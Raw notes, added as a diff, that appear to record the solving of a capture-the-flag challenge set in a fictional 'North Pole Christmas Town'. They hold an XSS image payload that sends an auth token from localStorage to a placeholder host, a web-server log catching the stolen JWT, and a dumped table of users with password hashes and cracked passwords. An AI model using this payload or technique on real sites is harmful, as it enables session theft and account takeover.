@@ -1,0 +1,62 @@
+Message <IMG SRC='#' onerror=this.src='http://IP/?c='+localStorage["np-auth"];>
+
+root@analysis:/var/www/html# python -m SimpleHTTPServer 80
+Serving HTTP on 0.0.0.0 port 80 ...
+35.196.239.128 - - [28/Dec/2017 13:48:30] "GET /?	c=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE3LTA4LTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.M7Z4I3CtrWt4SGwfg7mi6V9_4raZE5ehVkI9h04kr6I HTTP/1.1" 200 -
+
+-------------------------
+ jwt2john converted hash
+-------------------------
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE3LTA4LTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.M7Z4I3CtrWt4SGwfg7mi6V9_4raZE5ehVkI9h04kr6I
+________________________________________________________________________________________________________________________________________________________________________________________________________________________________
+
+----------------------------------------------------------------------------------------------------------------------------------
+ UID                               Password                       Dept                     Email
+----------------------------------------------------------------------------------------------------------------------------------
+rudolph			ff943fe99491b32ea387489106517af4	aviation	rudolph@northpolechristmastown.com
+blitzen			ff943fe99491b32ea387489106517af4	aviation	blitzen@northpolechristmastown.com
+donner			ff943fe99491b32ea387489106517af4	aviation	donner@northpolechristmastown.com
+cupid			ff943fe99491b32ea387489106517af4	aviation	cupid@northpolechristmastown.com
+comet			ff943fe99491b32ea387489106517af4	aviation	comet@northpolechristmastown.com
+vixen			ff943fe99491b32ea387489106517af4	aviation	vixen@northpolechristmastown.com
+prancer			ff943fe99491b32ea387489106517af4	aviation	prancer@northpolechristmastown.com
+dancer			ff943fe99491b32ea387489106517af4	aviation	dancer@northpolechristmastown.com
+dasher			ff943fe99491b32ea387489106517af4	aviation	dasher@northpolechristmastown.com
+tarpin.mcjinglehauser	f259e9a289c4633fc1e3ab11b4368254	workshop	tarpin.mcjinglehauser@northpolechristmastown.com
+holly.evergreen		031ef087617c17157bd8024f13bd9086	workshop	holly.evergreen@northpolechristmastown.com
+mary.sugarplum		b9c124f223cdc64ee2ae6abaeffbcbfe	workshop	mary.sugerplum@northpolechristmastown.com
+sparkle.redberry	82161cf4b4c1d94320200dfe46f0db4c	workshop	sparkle.redberry@northpolechristmastown.com
+wunorse.openslae	9fd69465699288ddd36a13b5b383e937	kitchen		wunorse.openslae@northpolechristmastown.com
+minty.candycane		bcf38b6e70b907d51d9fa4154954f992	workshop	minty.candycane@northpolechristmastown.com
+shimmy.upatree		d0930efed8e75d7c8ed2e7d8e1d04e81	workshop	shimmy.upatree@northpolechristmastown.com
+pepper.minstix		d0930efed8e75d7c8ed2e7d8e1d04e81	Security	pepper.minstix@northpolechristmastown.com
+bushy.evergreen		3d32700ab024645237e879d272ebc428	Engineering	bushy.evergreen@northpolechristmastown.com
+alabaster.snowball	17e22cc100b1806cdc3cf3b99a3480b5	Engineering	alabaster.snowball@northpolechristmastown.com
+jessica.claus		16268da802de6a2efe9c672ca79a7071	administrators	jessica.claus@northpolechristmastown.com
+santa.claus		d8b4c05a35b0513f302a85c409b4aab3	administrators	santa.claus@northpolechristmastown.com
+
+
+tarpin.mcjinglehauser@northpolechristmastown.com 	dozen age nation blind
+holly.evergreen@northpolechristmastown.com 		research accept cent did
+mary.sugerplum@northpolechristmastown.com		mark poem doll subject
+sparkle.redberry@northpolechristmastown.com		receive couple late copy
+wunorse.openslae@northpolechristmastown.com 		comfortable world yellow jungle
+minty.candycane@northpolechristmastown.com 		tight mass season may
+shimmy.upatree@northpolechristmastown.com 		wolf how policeman dance
+pepper.minstix@northpolechristmastown.com 		wolf how policeman dance
+bushy.evergreen@northpolechristmastown.com 		reason fight carried pack
+alabaster.snowball@northpolechristmastown.com 		power instrument gasoline film
+jessica.claus@northpolechristmastown.com 		in attention court daughter
+santa.claus@northpolechristmastown.com  		1iwantacookie
+
+
+
+
+
+
+
+
+
+
+
+
